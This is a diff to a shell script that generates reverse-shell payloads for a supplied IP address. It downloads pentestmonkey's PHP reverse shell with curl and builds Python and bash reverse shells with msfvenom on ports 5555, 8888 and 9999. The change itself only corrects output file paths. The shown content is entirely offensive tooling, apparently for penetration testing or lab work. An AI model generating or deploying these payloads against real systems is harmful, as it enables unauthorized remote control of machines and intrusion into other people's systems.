@@ -15,7 +15,7 @@ IP=$1
 
 rm ./revshell.php
 echo "Creating php revshell on $IP:5555"
-curl -L https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php >> .revshell.php
+curl -L https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php >> ./revshell.php
 
 SCRIPT="./revshell.php"
 
@@ -41,4 +41,4 @@ msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=8888 -f raw > ./revshell.py
 
 rm ./revshell.sh
 echo "Creating bash revshell on $IP:9999"
-msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=9999 -f raw > ./Tools/revshell.sh
+msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=9999 -f raw > ./revshell.sh
